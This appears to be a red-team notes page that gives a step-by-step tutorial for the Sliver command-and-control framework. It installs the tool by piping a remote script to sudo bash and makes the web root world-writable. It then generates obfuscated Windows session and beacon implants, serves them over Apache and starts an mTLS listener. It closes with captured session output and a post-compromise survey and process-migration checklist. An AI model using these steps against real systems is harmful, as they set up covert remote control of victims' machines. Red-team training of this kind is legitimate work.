# Sliver

### Installation

```
apt-get update -y 
apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
mkdir sliver 
cd sliver
curl https://sliver.sh/install|sudo bash
```

* Assuming `/usr/local/bin/` is in your path, your sliver server should be available in the shell as `sliver-server` and the client as `sliver`.

### Prepare a delivery method <a href="#prepare-a-delivery-method" id="prepare-a-delivery-method"></a>

On your C2 server, run `systemctl start apache2` to start a web server. You can now copy the implants you generate into the folder `/var/www/html` and Apache will serve them. To allow any system user to put a payload their, you can run `chmod -R 777 /var/www/html`.

### Generating the implant <a href="#generating-the-implant" id="generating-the-implant"></a>

Implant generation happens on the C2 server with the `generate` command. Connect to it and run `help generate` to read the extensive help page and learn about all the flags. Here is a selection of the most important flags for now:

* `--mtls 192.168.122.111`: Specifies that the implant should connect to the Sliver server using a mutually authenticated TLS connection. Other options would be `--wg` for WireGuard, `--http` for HTTP(S) connections or `--dns` for DNS-based C2.
* `--os windows`: specifies that we want to run the implant on Windows (which is the default, so we could omit this one). MacOS and Linux are also supported.
* `--arch amd64`" specifies that we want a 64-bit implant (also the default, could be omitted). Use `--arch 386` for a 32-bit one.
* `--format exe`: specifies that we want an executable file (again the default). Other options are `--format shared` for dynamic libraries, `--format service` for a Windows service binary (can be used with the `psexec` command) and `shellcode` (only windows).
* `--save /var/www/html/`: specifies the directory to save the binary to. I like to use the Apache web root.

```
sliver > generate --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html
```

### Fix Permissions&#x20;

The file `/var/www/html/MEDICAL_CHANGE.exe` will not be owned by the Apache system user and has very restrictive file system permissions. To make it accessible for Apache, run `sudo chown www-data:www-data /var/www/html/MEDICAL_CHANGE.exe`.

### Start Listener



Now start the mTLS listener on the C2 server using the `mtls` command. By default, it starts the listener on port 8888. You can view your listeners with the `jobs` command:

```
sliver > mtls

[*] Starting mTLS listener ...
sliver > 
[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888
```

### Transfer Binary to Target&#x20;

<figure><img src="../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

### Execute The Binary

* If all is successful you will see a new session opened

```
[*] Session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:36:48 CEST
```

### Using a session <a href="#using-a-session" id="using-a-session"></a>

You can use your session with the `use` command. Just type it, hit enter, and an interactive prompt will appear that allows to select a session. Hit enter again and your prompt changes to the implant name, which was `MEDICAL_CHANGE` in my case. The session is now active and ready to accept your commands. With `info`, you can get more information about the implant:

```
sliver > use

? Select a session or beacon: SESSION  971c5a23  MEDICAL_CHANGE  192.168.122.160:50051  DESKTOP-IPQVF9T  DESKTOP-IPQVF9T\tester  windows/amd64
[*] Active session MEDICAL_CHANGE (971c5a23-73e0-4418-b9c2-266484546e0d)

sliver (MEDICAL_CHANGE) > info

        Session ID: 971c5a23-73e0-4418-b9c2-266484546e0d
              Name: MEDICAL_CHANGE
          Hostname: DESKTOP-IPQVF9T
              UUID: d512a12c-6b6d-4f19-814e-1f60088e9563
          Username: DESKTOP-IPQVF9T\tester
               UID: S-1-5-21-2966923018-1740081829-2498838087-1001
               GID: S-1-5-21-2966923018-1740081829-2498838087-513
               PID: 7244
                OS: windows
           Version: 10 build 19044 x86_64
              Arch: amd64
         Active C2: mtls://192.168.122.111:8888
    Remote Address: 192.168.122.160:50051
         Proxy URL: 
Reconnect Interval: 1m0s
```

Sliver implants supports several commands. You can get a full list with `help`. Features include file system exploration, file up- and downloads, port forwarding, taking screenshots and much more.

### Kill Session

```
sessions 
sessions -k session_id
```

```
sliver > sessions

 ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
========== =========== ======================= ================= ========== ================== =========
 971c5a23   mtls        192.168.122.160:50051   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE] 

sliver > sessions -k 971c5a23


[!] Lost session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:52:53 CEST
```

### Kill Jobs&#x20;

* To kill your listener&#x20;

```
[server] sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 

[server] sliver > jobs -k 1

[*] Killing job #1 ...
[*] Successfully killed job #1
[!] Job #1 stopped (tcp/mtls)

```

### Generating Beaconing implant <a href="#generating-the-implant-1" id="generating-the-implant-1"></a>

Generating a beacon implant is very similar to session implant generation. You use the `generate beacon` command. Learn all about the flags with `help generate beacon`. Aside from all the flags discussed above, relevant beacon flags are:

* `--seconds 5`: specify that the beacon should contact the C2 server every 5 seconds. You could alternatively use `--minutes`, `--hours` or `--days`.
* `--jitter 3`: specify that an additional random delay of up to 3 seconds should be added to the 5 seconds interval.

This is how I generated the beacon:

```
sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html --seconds 5 --jitter 3

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:00:18
[*] Implant saved to /var/www/html/STALE_PNEUMONIA.exe
```

### Sliver Survey

* Execute the following commands in order upon session opening

```
info               Get info about session
getgid             Get session process GID
getpid             Get session pid
getuid             Get session process UID
whoami             Get session user execution context
ps                 List remote processes
netstat            Print network connection information
pwd                Print working directory
ls                 List current directory
screenshot         Take a screenshot
getprivs          Get current privileges (Windows only)
```

* After this general survey, decide if you want/need (opsec) to migrate to a new process or not.

```
migrate           Migrate into a remote process
getprivs          Get current privileges (Windows only)
```
